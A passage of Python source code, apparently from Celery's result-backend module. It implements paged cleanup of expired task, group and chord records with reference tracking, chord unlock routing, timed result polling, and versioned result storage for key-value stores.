        return parsed.astimezone(timezone.utc)

    def _cleanup_key(self, key):
        if isinstance(key, bytes):
            key = key.decode('utf-8', 'surrogateescape')
        return str(key)

    def _cleanup_iter_records(self, cursor=None, limit=None, record_types=None):
        raise NotImplementedError('backend does not implement cleanup scanning')

    def _cleanup_normalize_record(self, key, raw, now):
        raise NotImplementedError('backend does not implement record decoding')

    def _cleanup_condition_delete(self, record, now, referenced=None):
        raise NotImplementedError('backend does not implement conditional delete')

    def _cleanup_record_age(self, record, now):
        for field in ('date_created', 'date_updated', 'date_done'):
            timestamp = self._cleanup_datetime(record.get(field))
            if timestamp is not None:
                return (now - timestamp).total_seconds(), field
        return None, None

    def _cleanup_record_references(self, record):
        references = set()
        record_type = record.get('type', RESULT_CLEANUP_TYPE_RESULT)
        data = record.get('data') or {}

        if record_type == RESULT_CLEANUP_TYPE_RESULT:
            for child in data.get('children') or ():
                try:
                    references.add(str(child[0]))
                except (IndexError, TypeError):
                    continue
        elif record_type == RESULT_CLEANUP_TYPE_GROUP:
            result = data.get('result')
            if result is not None:
                try:
                    nodes = result[1]
                except (IndexError, TypeError):
                    nodes = ()
                for child in nodes or ():
                    try:
                        references.add(str(child[0][0]))
                    except (IndexError, TypeError):
                        try:
                            references.add(str(child[0]))
                        except (IndexError, TypeError):
                            continue
        elif record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE:
            if isinstance(data, dict):
                for value in data.get('groups', ()):
                    references.add(str(value))
                for value in data.get('task_ids', ()):
                    references.add(str(value))
                if data.get('task_id'):
                    references.add(str(data['task_id']))
                if data.get('group_id'):
                    references.add(str(data['group_id']))
            body_id = data.get('body_task_id') if isinstance(data, dict) else None
            if body_id:
                references.add(str(body_id))

        return references

    def _cleanup_referenced_ids(self, records):
        referenced = set()
        for record in records:
            referenced.update(self._cleanup_record_references(record))
        return referenced

    def _cleanup_record_ttl(self, record):
        record_type = record.get('type', RESULT_CLEANUP_TYPE_RESULT)
        status = record.get('status') or states.SUCCESS
        data = record.get('data') or {}
        if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE:
            ttl = data.get('ttl')
            if ttl is not None:
                return self._ttl_seconds(ttl)
        return self.result_ttl_for(
            state=status,
            record_type=record_type,
            ignore_result=bool(data.get('ignore_result')),
        )

    def _cleanup_event(self, record, reason, now, age_field=None, ttl=None):
        expired_at = None
        timestamp = self._cleanup_datetime(record.get(age_field)) if age_field else None
        if timestamp is not None and ttl is not None:
            expired_at = (timestamp + timedelta(seconds=ttl)).isoformat()
        return cleanup_event_t(
            key=record.get('key'),
            type=record.get('type', RESULT_CLEANUP_TYPE_RESULT),
            status=record.get('status'),
            reason=reason,
            expired_at=expired_at,
            deleted_at=now.isoformat(),
        )

    def _cleanup_report(self, deleted, retained, scanned, skipped,
                        cursor, events, errors=None):
        return cleanup_report_t(
            deleted=Counter(deleted),
            retained=Counter(retained),
            scanned=Counter(scanned),
            skipped=Counter(skipped),
            cursor=cursor,
            events=tuple(events),
            errors=tuple(errors or ()),
        )

    def cleanup(self, cursor=None, limit=None, strict=False, dry_run=False):
        """Delete expired results and return an idempotent cleanup report."""
        cursor = dict(cursor or {})
        limit = self.result_cleanup_batch_size if limit is None else int(limit)
        if limit < 1:
            raise ImproperlyConfigured('Result cleanup batch size must be positive.')

        def unsupported(exc, reason):
            if strict:
                raise BackendCleanupError(
                    f'{type(self).__name__} cannot safely run result cleanup: {exc}'
                ) from exc
            return None

        if not self.supports_result_cleanup_scan:
            return unsupported(
                NotImplementedError('result enumeration is unsupported'),
                'unsupported_scan')
        if not self.supports_atomic_result_cleanup:
            return unsupported(
                NotImplementedError('conditional deletion is unsupported'),
                'unsupported_conditional_delete')

        now = self._cleanup_now()
        aggregate_types = (
            RESULT_CLEANUP_TYPE_GROUP,
            RESULT_CLEANUP_TYPE_CHORD,
            RESULT_CLEANUP_TYPE_PENDING_REFERENCE,
        )

        phase = cursor.get('phase', 'references')
        referenced = set(cursor.get('referenced', ()))
        if not cursor.get('complete', True):
            scan_state = {
                'scan_cursor': cursor.get('scan_cursor', 0),
                'pattern_index': cursor.get('pattern_index', 0),
            }
        else:
            scan_state = {'scan_cursor': 0, 'pattern_index': 0}

        def scan(after_key, record_types):
            batch = list(self._cleanup_iter_records(
                cursor={'after_key': after_key, **scan_state}, limit=limit,
                record_types=record_types))
            normalized = []
            for key, raw in batch:
                try:
                    record = self._cleanup_normalize_record(key, raw, now)
                except Exception as exc:
                    continue
                if record_types is None or record['type'] in record_types:
                    normalized.append(record)
            has_more = len(batch) == limit or getattr(
                self, '_last_cleanup_scan_cursor', 0) not in (0, '0', None)
            scan_cursor = getattr(self, '_last_cleanup_scan_cursor', 0)
            pattern_index = getattr(self, '_last_cleanup_pattern_index', 0)
            return normalized, has_more, scan_cursor, pattern_index

        events = []
        counters = {
            'deleted': Counter(), 'retained': Counter(), 'scanned': Counter(),
            'skipped': Counter(),
        }
        errors = []

        if phase == 'references':
            records, has_more, scan_cursor, pattern_index = scan(
                cursor.get('after_key'), aggregate_types)
            for record in records:
                counters['scanned'][record['type']] += 1
                referenced.update(self._cleanup_record_references(record))
            next_cursor = {
                'phase': 'aggregates',
                'after_key': None,
                'referenced': sorted(referenced),
                'scan_cursor': scan_cursor,
                'pattern_index': pattern_index,
                'limit': limit,
                'complete': not has_more,
            }
            if has_more:
                next_cursor['phase'] = 'references'
                next_cursor['after_key'] = records[-1]['key']
                next_cursor['complete'] = False
            return self._cleanup_report(
                counters['deleted'], counters['retained'], counters['scanned'],
                counters['skipped'], next_cursor, events, errors)

        if phase == 'aggregates':
            records, has_more, scan_cursor, pattern_index = scan(
                cursor.get('after_key'), aggregate_types)
            for record in records:
                counters['scanned'][record['type']] += 1
                current_references = self._cleanup_record_references(record)
                referenced.update(current_references)
                protected = referenced - {record.get('id')}
                deleted = self._cleanup_expire_record(
                    record, now, protected, dry_run, counters, events, errors, strict)
                if deleted:
                    if record['type'] == RESULT_CLEANUP_TYPE_GROUP:
                        self.delete(self.get_key_for_group(record['id'], '.pending'))
                        for referenced_id in current_references:
                            self._remove_result_reference(referenced_id, record['id'])
                    referenced.difference_update(current_references)
            next_cursor = {
                'phase': 'results',
                'after_key': None,
                'referenced': sorted(referenced),
                'scan_cursor': scan_cursor,
                'pattern_index': pattern_index,
                'limit': limit,
                'complete': not has_more,
            }
            if has_more:
                next_cursor['phase'] = 'aggregates'
                next_cursor['after_key'] = records[-1]['key']
                next_cursor['complete'] = False
            return self._cleanup_report(
                counters['deleted'], counters['retained'], counters['scanned'],
                counters['skipped'], next_cursor, events, errors)

        records, has_more, scan_cursor, pattern_index = scan(
            cursor.get('after_key'), (RESULT_CLEANUP_TYPE_RESULT,))
        for record in records:
            counters['scanned'][record['type']] += 1
            self._cleanup_expire_record(
                record, now, referenced, dry_run, counters, events, errors, strict)
        next_cursor = {
            'phase': 'done',
            'after_key': records[-1]['key'] if records and has_more else None,
            'referenced': sorted(referenced),
            'scan_cursor': scan_cursor,
            'pattern_index': pattern_index,
            'limit': limit,
            'complete': not has_more,
        }
        if has_more:
            next_cursor['phase'] = 'results'
        return self._cleanup_report(
            counters['deleted'], counters['retained'], counters['scanned'],
            counters['skipped'], next_cursor, events, errors)

    def _cleanup_expire_record(self, record, now, referenced, dry_run,
                                counters, events, errors, strict):
        record_type = record['type']
        ttl = self._cleanup_record_ttl(record)
        age, age_field = self._cleanup_record_age(record, now)
        if ttl is None:
            counters['retained'][record_type] += 1
            return False
        if age is None:
            counters['retained'][record_type] += 1
            return False
        if age < ttl:
            counters['retained'][record_type] += 1
            return False
        if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE and record.get('id') in referenced:
            counters['retained'][record_type] += 1
            return False
        if record.get('id') in referenced:
            counters['retained'][record_type] += 1
            return False
        if dry_run:
            counters['skipped'][record_type] += 1
            events.append(self._cleanup_event(record, 'dry_run', now, age_field, ttl))
            return False

        try:
            deleted = self._cleanup_condition_delete(record, now, referenced)
        except NotImplementedError as exc:
            if strict:
                raise BackendCleanupError(
                    f'{type(self).__name__} cannot conditionally delete {record.get("key")!r}.'
                ) from exc
            counters['skipped'][record_type] += 1
            errors.append(str(exc))
            return False
        if deleted:
            counters['deleted'][record_type] += 1
            events.append(self._cleanup_event(record, 'ttl_expired', now, age_field, ttl))
            return True
        counters['retained'][record_type] += 1
        return False

    def process_cleanup(self):
        """Cleanup actions to do at the end of a task worker process."""

    def on_task_call(self, producer, task_id):
        return {}

    def add_to_chord(self, chord_id, result):
        raise NotImplementedError('Backend does not support add_to_chord')

    def on_chord_part_return(self, request, state, result, **kwargs):
        pass

    def set_chord_size(self, group_id, chord_size):
        pass

    def _chord_body_task_id(self, body):
        options = getattr(body, 'options', {}) or {}
        return options.get('task_id') or getattr(body, 'id', None)

    def _save_result_reference(self, task_id, group_id, ttl):
        return None

    def _result_reference_exists(self, task_id, group_id=None, referenced=None):
        return False

    def _remove_result_reference(self, task_id, group_id):
        return False

    def _save_chord_body_reference(self, header_result, body):
        body_task_id = self._chord_body_task_id(body)
        ttl = self.result_ttl_for(record_type=RESULT_CLEANUP_TYPE_PENDING_REFERENCE)
        for result in header_result.results:
            self._save_result_reference(result.id, header_result.id, ttl)
        if body_task_id:
            self._save_result_reference(body_task_id, header_result.id, ttl)
        return body_task_id

    def fallback_chord_unlock(self, header_result, body, countdown=1,
                              **kwargs):
        kwargs['result'] = [r.as_tuple() for r in header_result]
        try:
            body_type = getattr(body, 'type', None)
        except NotRegistered:
            body_type = None

        queue = body.options.get('queue', getattr(body_type, 'queue', None))

        if queue is None:
            # fallback to default routing if queue name was not
            # explicitly passed to body callback
            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name

        priority = body.options.get('priority', getattr(body_type, 'priority', 0))

        stamps = body.options.get('stamped_headers', ())
        routing_options = {}
        for option in ('exchange', 'exchange_type', 'routing_key', 'headers'):
            if option in stamps:
                continue
            value = body.options.get(option)
            if value is not None:
                routing_options[option] = value

        if 'exchange_type' not in routing_options:
            try:
                queue_obj = self.app.amqp.queues[queue] if isinstance(queue, str) else queue
                routing_options['exchange_type'] = queue_obj.exchange.type
            except (AttributeError, KeyError):
                pass
        if 'exchange_type' in routing_options:
            # unlock_chord needs this for retries.
            kwargs['_chord_unlock_exchange_type'] = routing_options['exchange_type']

        self.app.tasks['celery.chord_unlock'].apply_async(
            (header_result.id, body,), kwargs,
            countdown=countdown,
            queue=queue,
            priority=priority,
            **routing_options,
        )

    def ensure_chords_allowed(self):
        pass

    def apply_chord(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        self._save_chord_body_reference(header_result, body)
        self.fallback_chord_unlock(header_result, body, **kwargs)

    def current_task_children(self, request=None):
        request = request or getattr(get_current_task(), 'request', None)
        if request:
            return [r.as_tuple() for r in getattr(request, 'children', [])]

    def __reduce__(self, args=(), kwargs=None):
        kwargs = {} if not kwargs else kwargs
        return (unpickle_backend, (self.__class__, args, kwargs))


class SyncBackendMixin:
    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,
                    on_message=None, on_interval=None):
        self._ensure_not_eager()
        results = result.results
        if not results:
            return

        task_ids = set()
        for result in results:
            if isinstance(result, ResultSet):
                yield result.id, result.results
            else:
                task_ids.add(result.id)

        yield from self.get_many(
            task_ids,
            timeout=timeout, interval=interval, no_ack=no_ack,
            on_message=on_message, on_interval=on_interval,
        )

    def wait_for_pending(self, result, timeout=None, interval=0.5,
                         no_ack=True, on_message=None, on_interval=None,
                         callback=None, propagate=True):
        self._ensure_not_eager()
        if on_message is not None:
            raise ImproperlyConfigured(
                'Backend does not support on_message callback')

        meta = self.wait_for(
            result.id, timeout=timeout,
            interval=interval,
            on_interval=on_interval,
            no_ack=no_ack,
        )
        if meta:
            result._maybe_set_cache(meta)
            return result.maybe_throw(propagate=propagate, callback=callback)

    def wait_for(self, task_id,
                 timeout=None, interval=0.5, no_ack=True, on_interval=None):
        """Wait for task and return its result.

        If the task raises an exception, this exception
        will be re-raised by :func:`wait_for`.

        Raises:
            celery.exceptions.TimeoutError:
                If `timeout` is not :const:`None`, and the operation
                takes longer than `timeout` seconds.
        """
        self._ensure_not_eager()

        time_elapsed = 0.0

        while 1:
            meta = self.get_task_meta(task_id)
            if meta['status'] in states.READY_STATES:
                return meta
            if on_interval:
                on_interval()
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError('The operation timed out.')
            # avoid hammering the CPU checking status. Never sleep past the
            # deadline: with the sleep first, timeout=0 blocked for a whole
            # interval before giving up, and any timeout below interval
            # overshot to interval.
            nap = interval if timeout is None else min(interval, timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap

    def add_pending_result(self, result, weak=False):
        return result

    def remove_pending_result(self, result):
        return result

    @property
    def is_async(self):
        return False


class BaseBackend(Backend, SyncBackendMixin):
    """Base (synchronous) result backend."""


BaseDictBackend = BaseBackend  # XXX compat


class BaseKeyValueStoreBackend(Backend):
    key_t = ensure_bytes
    task_keyprefix = 'celery-task-meta-'
    group_keyprefix = 'celery-taskset-meta-'
    chord_keyprefix = 'chord-unlock-'
    implements_incr = False
    supports_result_cleanup_scan = False
    supports_atomic_result_cleanup = False
    supports_atomic_result_transitions = False

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._add_global_keyprefix()
        self._encode_prefixes()
        if self.implements_incr:
            self.apply_chord = self._apply_chord_incr

    def _add_global_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
        """
        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
        if global_keyprefix:
            if global_keyprefix[-1] not in ':_-.':
                global_keyprefix += '_'
            self.task_keyprefix = f"{global_keyprefix}{self.task_keyprefix}"
            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
            self.chord_keyprefix = f"{global_keyprefix}{self.chord_keyprefix}"

    def _encode_prefixes(self):
        self.task_keyprefix = self.key_t(self.task_keyprefix)
        self.group_keyprefix = self.key_t(self.group_keyprefix)
        self.chord_keyprefix = self.key_t(self.chord_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def _set_with_state(self, key, value, state, ttl=None):
        return self.set(key, value)

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def get_key_for_task(self, task_id, key=''):
        """Get the cache key for a task by id."""
        if task_id is None or task_id == '':
            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
        return self._get_key_for(self.task_keyprefix, task_id, key)

    def get_key_for_group(self, group_id, key=''):
        """Get the cache key for a group by id."""
        if group_id is None or group_id == '':
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.group_keyprefix, group_id, key)

    def get_key_for_chord(self, group_id, key=''):
        """Get the cache key for the chord waiting on group with given id."""
        if group_id is None or group_id == '':
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.chord_keyprefix, group_id, key)

    def _get_key_for(self, prefix, id, key=''):
        key_t = self.key_t
        id = str(id) if isinstance(id, UUID) else str(id)

        return key_t('').join([
            prefix, key_t(id), key_t(key),
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        for prefix in self.task_keyprefix, self.group_keyprefix:
            if key.startswith(prefix):
                return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_ready(self, values, READY_STATES=states.READY_STATES):
        for k, value in values:
            if value is not None:
                value = self.decode_result(value)
                if value['status'] in READY_STATES:
                    yield k, value

    def _iter_cleanup_keys(self, cursor=None, limit=None):
        raise NotImplementedError('backend does not implement key enumeration')

    def _cleanup_scan_cursor(self, cursor):
        scan_cursor = (cursor or {}).get('scan_cursor')
        return 0 if scan_cursor is None else scan_cursor

    def _cleanup_scan_state(self, cursor):
        return {
            'scan_cursor': self._cleanup_scan_cursor(cursor),
            'pattern_index': (cursor or {}).get('pattern_index', 0),
        }

    def _cleanup_key_type(self, key):
        key = self.key_t(key)
        if key.startswith(self.task_keyprefix):
            identifier = key[len(self.task_keyprefix):]
            if identifier.endswith(self.key_t('.ref')):
                return RESULT_CLEANUP_TYPE_PENDING_REFERENCE
            return RESULT_CLEANUP_TYPE_RESULT
        if key.startswith(self.group_keyprefix):
            suffix = key[len(self.group_keyprefix):]
            if suffix.startswith(self.key_t('.pending')):
                return RESULT_CLEANUP_TYPE_PENDING_REFERENCE
            if suffix.startswith(self.key_t('.')):
                return RESULT_CLEANUP_TYPE_CHORD
            return RESULT_CLEANUP_TYPE_GROUP
        if key.startswith(self.chord_keyprefix):
            return RESULT_CLEANUP_TYPE_CHORD
        return None

    def _cleanup_record_id(self, key, record_type):
        key = self.key_t(key)
        if record_type == RESULT_CLEANUP_TYPE_RESULT:
            return bytes_to_str(key[len(self.task_keyprefix):])
        if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE and key.startswith(self.task_keyprefix):
            identifier = bytes_to_str(key[len(self.task_keyprefix):])
            return identifier[:-len('.ref')] if identifier.endswith('.ref') else identifier
        if record_type == RESULT_CLEANUP_TYPE_GROUP:
            identifier = bytes_to_str(key[len(self.group_keyprefix):])
            return identifier.split('.', 1)[0]
        if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE:
            identifier = bytes_to_str(key[len(self.group_keyprefix):])
            return identifier.split('.', 1)[0]
        return bytes_to_str(self._strip_prefix(key))

    def _cleanup_iter_records(self, cursor=None, limit=None, record_types=None):
        cursor = cursor or {}
        selected = []
        result = self._iter_cleanup_keys(cursor=cursor, limit=limit)
        if isinstance(result, tuple):
            keys, scan_cursor = result
            keys = list(keys)
        else:
            keys = list(result)
            scan_cursor = 0
            self._last_cleanup_pattern_index = 0
        while len(selected) < limit:
            after_key = cursor.get('after_key')
            if after_key is not None:
                after_key = self.key_t(after_key)
                keys = [key for key in keys if self.key_t(key) > after_key]
            for key in sorted(keys, key=self.key_t):
                if record_types is None or self._cleanup_key_type(key) in record_types:
                    selected.append(key)
                    if len(selected) == limit:
                        break
            if scan_cursor in (0, '0', None):
                break
            keys, scan_cursor = self._iter_cleanup_keys(
                cursor=dict(cursor, scan_cursor=scan_cursor), limit=limit)
            keys = list(keys)
        self._last_cleanup_scan_cursor = scan_cursor
        return [(key, self.get(key)) for key in selected[:limit]]

    def _cleanup_normalize_record(self, key, raw, now):
        key = self.key_t(key)
        record_type = self._cleanup_key_type(key) or RESULT_CLEANUP_TYPE_RESULT
        record_id = self._cleanup_record_id(key, record_type)
        if raw is None:
            raise KeyError(key)

        if record_type == RESULT_CLEANUP_TYPE_RESULT:
            data = self.decode_result(raw)
            status = data.get('status', states.PENDING)
        else:
            data = self.decode(raw)
            status = states.SUCCESS
            if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE:
                status = data.get('status', states.PENDING)

        return {
            'key': bytes_to_str(key),
            'id': record_id,
            'type': record_type,
            'status': status,
            'data': data,
            'raw': raw,
            'version': data.get('version'),
            'date_created': data.get('date_created'),
            'date_updated': data.get('date_updated'),
            'date_done': data.get('date_done'),
        }

    def _cleanup_condition_delete(self, record, now, referenced=None):
        key = self.key_t(record['key'])
        current = self.get(key)
        if current is None:
            return False
        try:
            current_data = self.decode(current)
        except Exception:
            return False
        if current_data.get('version') != record['data'].get('version'):
            return False
        age, age_field = self._cleanup_record_age(
            {
                'date_created': current_data.get('date_created'),
                'date_updated': current_data.get('date_updated'),
                'date_done': current_data.get('date_done'),
            }, now)
        ttl = self._cleanup_record_ttl({
            'type': record['type'],
            'status': current_data.get('status', record['status']),
            'data': current_data,
        })
        if ttl is None or age is None or age < ttl:
            return False
        if record['type'] == RESULT_CLEANUP_TYPE_RESULT and self._result_reference_exists(
                record['id'], referenced=referenced):
            return False
        self.delete(key)
        return True

    def _compare_and_set_result(self, task_id, encoded, state, expected_version):
        key = self.get_key_for_task(task_id)
        current = self.get(key)
        current_meta = self.decode_result(current) if current else {
            'status': states.PENDING,
            'version': 0,
        }
        current_version = current_meta.get('version', 0)
        if current_version != expected_version and not (
                current_version == 0 and
                current_meta.get('status') == states.PENDING):
            return False
        self._set_with_state(
            key, encoded, state, ttl=self.result_ttl_for(state=state))
        return True

    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_ready(values.items(), READY_STATES)
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(keys[i]): v
                for i, v in self._filter_ready(enumerate(values), READY_STATES)
            }

    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,
                 on_message=None, on_interval=None, max_iterations=None,
                 READY_STATES=states.READY_STATES):
        interval = 0.5 if interval is None else interval
        ids = task_ids if isinstance(task_ids, set) else set(task_ids)
        cached_ids = set()
        cache = self._cache
        for task_id in ids:
            try:
                cached = cache[task_id]
            except KeyError:
                pass
            else:
                if cached['status'] in READY_STATES:
                    yield bytes_to_str(task_id), cached
                    cached_ids.add(task_id)

        ids.difference_update(cached_ids)
        iterations = 0
        time_elapsed = 0.0
        while ids:
            keys = list(ids)
            r = self._mget_to_results(self.mget([self.get_key_for_task(k)
                                                 for k in keys]), keys, READY_STATES)
            cache.update(r)
            ids.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if not ids:
                # everything asked for has been handed back, so there is
                # nothing left to time out on. wait_for checks the same way,
                # returning a ready result before it looks at the deadline.
                break
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            # don't busy loop, and never sleep past the deadline: with the
            # deadline counted in whole intervals, timeout=0 waited forever
            # and any timeout below interval overshot to interval.
            nap = interval if timeout is None else min(interval,
                                                       timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _forget(self, task_id):
        if not self._condition_forget(task_id):
            raise BackendStoreError(
                'cannot forget a result that is not ready',
                task_id=bytes_to_str(task_id))

    def _condition_forget(self, task_id, ready=True):
        key = self.get_key_for_task(task_id)
        raw = self.get(key)
        if raw is None:
            return True
        meta = self.decode_result(raw)
        if ready and meta.get('status') not in self.READY_STATES:
            return False
        self.delete(key)
        return True

    def _store_result(self, task_id, result, state,
                      traceback=None, request=None, **kwargs):
        current_meta = self._get_task_meta_for(task_id)
        if current_meta['status'] == states.SUCCESS:
            return result

        meta = self._get_result_meta(
            result=result, state=state, traceback=traceback,
            request=request, current_meta=current_meta)
        meta['task_id'] = bytes_to_str(task_id)
        encoded = self.encode(meta)
        expected_version = int(current_meta.get('version') or 0)

        if self.supports_atomic_result_transitions:
            if not self._compare_and_set_result(task_id, encoded, state, expected_version):
                if self._get_task_meta_for(task_id)['status'] == states.SUCCESS:
                    return result
                raise BackendStoreError(
                    'result version changed while storing',
                    state=state, task_id=bytes_to_str(task_id))
        else:
            if self.app.conf.get('result_ttl') is not None:
                warnings.warn(
                    W_RESULT_TRANSITION_UNSUPPORTED.format(type(self).__name__),
                    UserWarning,
                )
            try:
                ttl = self.result_ttl_for(state=state)
                self._set_with_state(
                    self.get_key_for_task(task_id), encoded, state, ttl=ttl)
            except BackendStoreError as ex:
                raise BackendStoreError(
                    str(ex), state=state, task_id=bytes_to_str(task_id)) from ex

        return result

    def _save_group(self, group_id, result):
        timestamp = self.app.now().isoformat()
        meta = {
            'result': result.as_tuple(),
            'date_created': timestamp,
            'date_updated': timestamp,
            'version': 1,
        }
        self._set_with_state(
            self.get_key_for_group(group_id), self.encode(meta), states.SUCCESS,
            ttl=self.result_ttl_for(record_type=RESULT_CLEANUP_TYPE_GROUP))
        reference_ttl = self.result_ttl_for(
            record_type=RESULT_CLEANUP_TYPE_PENDING_REFERENCE)
        for child in result.results:
            self._save_result_reference(child.id, group_id, reference_ttl)
        return result

    def _save_pending_reference(self, group_id, data, reference_type):
        timestamp = self.app.now().isoformat()
        payload = dict(
            data, type=reference_type, status=states.PENDING,
            date_created=timestamp, date_updated=timestamp, version=1)
        self._set_with_state(
            self.get_key_for_group(group_id, '.pending'),
            self.encode(payload), states.PENDING,
            ttl=self.result_ttl_for(
                record_type=RESULT_CLEANUP_TYPE_PENDING_REFERENCE))
        return payload

    def _save_result_reference(self, task_id, group_id, ttl):
        ttl = ttl if ttl is not None else self.result_ttl_for(
            record_type=RESULT_CLEANUP_TYPE_PENDING_REFERENCE)
        group_ttl = self.result_ttl_for(record_type=RESULT_CLEANUP_TYPE_GROUP)
        if ttl is None:
            ttl = group_ttl
        elif group_ttl is not None:
            ttl = max(ttl, group_ttl)
        timestamp = self.app.now().isoformat()
        key = self.get_key_for_task(task_id, '.ref')
        groups = {str(group_id)}
        raw = self.get(key)
        if raw is not None:
            current = self.decode(raw)
            groups.update(str(group) for group in current.get('groups', ()))
            current_ttl = self._ttl_seconds(current.get('ttl'))
            if current_ttl is not None:
                ttl = current_ttl if ttl is None else max(ttl, current_ttl)
        payload = {
            'type': RESULT_CLEANUP_TYPE_PENDING_REFERENCE,
            'status': states.PENDING,
            'task_id': task_id,
            'groups': sorted(groups),
            'ttl': ttl,
            'date_created': timestamp,
            'date_updated': timestamp,
            'version': 1,
        }
        self._set_with_state(
            key,
            self.encode(payload), states.PENDING, ttl=ttl)
        return payload

    def _result_reference_exists(self, task_id, group_id=None, referenced=None):
        for candidate_group_id in referenced or [group_id]:
            if candidate_group_id is None:
                continue
            marker = self.get(self.get_key_for_task(task_id, '.ref'))
            if marker is None:
                continue
            try:
                payload = self.decode(marker)
            except Exception:
                return True
            groups = payload.get('groups', ())
            if str(candidate_group_id) in {str(group) for group in groups}:
                return True
        return False

    def _remove_result_reference(self, task_id, group_id):
        key = self.get_key_for_task(task_id, '.ref')
        raw = self.get(key)
        if raw is None:
            return False
        payload = self.decode(raw)
        groups = {str(group) for group in payload.get('groups', ())}
        groups.discard(str(group_id))
        if not groups:
            self.delete(key)
        else:
            payload['groups'] = sorted(groups)
            payload['date_updated'] = self.app.now().isoformat()
            payload['version'] = int(payload.get('version') or 0) + 1
            self._set_with_state(
                key, self.encode(payload), states.PENDING,
                ttl=self._ttl_seconds(payload.get('ttl')))
        return True

    def _delete_group(self, group_id):
        self.delete(self.get_key_for_group(group_id))

    def _get_task_meta_for(self, task_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_task(task_id))
        if not meta:
            return {'status': states.PENDING, 'result': None}
        return self.decode_result(meta)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        This overrides the base implementation to directly check for
        the existence of the key in the store, which is more accurate
        than checking the status since tasks stored with PENDING status
        would still be detected.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return bool(self.get(self.get_key_for_task(task_id)))

    def _restore_group(self, group_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_group(group_id))
        # previously this was always pickled, but later this
        # was extended to support other serializers, so the
        # structure is kind of weird.
        if meta:
            meta = self.decode(meta)
            result = meta['result']
            meta['result'] = result_from_tuple(result, self.app)
            return meta

    def _apply_chord_incr(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        self._save_chord_body_reference(header_result, body)
        header_result.save(backend=self)

    def _save_chord_body_reference(self, header_result, body):
        body_task_id = self._chord_body_task_id(body)
        reference_ttl = self.result_ttl_for(
            record_type=RESULT_CLEANUP_TYPE_PENDING_REFERENCE)
        for result in header_result.results:
            self._save_result_reference(result.id, header_result.id, reference_ttl)
        if body_task_id:
            self._save_result_reference(body_task_id, header_result.id, reference_ttl)
        self._save_pending_reference(header_result.id, {
            'task_ids': [result.id for result in header_result.results],
            'body_task_id': body_task_id,
        }, RESULT_CLEANUP_TYPE_PENDING_REFERENCE)
        return self.get_key_for_group(header_result.id, '.pending')

    def on_chord_part_return(self, request, state, result, **kwargs):
        if not self.implements_incr:
            return
        app = self.app
        gid = request.group
        if not gid:
            return
        key = self.get_key_for_chord(gid)
        try:
            deps = GroupResult.restore(gid, backend=self)
        except Exception as exc:  # pylint: disable=broad-except
            callback = maybe_signature(request.chord, app=app)
            logger.exception('Chord %r raised: %r', gid, exc)
            return self.chord_error_from_stack(
                callback,
                ChordError(f'Cannot restore group: {exc!r}'),
            )
        if deps is None:
            try:
                raise ValueError(gid)
            except ValueError as exc:
                callback = maybe_signature(request.chord, app=app)
                logger.exception('Chord callback %r raised: %r', gid, exc)
                return self.chord_error_from_stack(
                    callback,
                    ChordError(f'GroupResult {gid} no longer exists'),
                )
        val = self.incr(key)
        # Set the chord size to the value defined in the request, or fall back
        # to the number of dependencies we can see from the restored result
        size = request.chord.get("chord_size")
        if size is None:
            size = len(deps)
        if val > size:  # pragma: no cover
            logger.warning('Chord counter incremented too many times for %r',
                           gid)
        elif val == size:
            callback = maybe_signature(request.chord, app=app)
            j = deps.join_native if deps.supports_native_join else deps.join
            try:
                with allow_join_result():
                    ret = j(
                        timeout=app.conf.result_chord_join_timeout,
                        propagate=True)
            except Exception as exc:  # pylint: disable=broad-except
                try:
                    culprit = next(deps._failed_join_report())
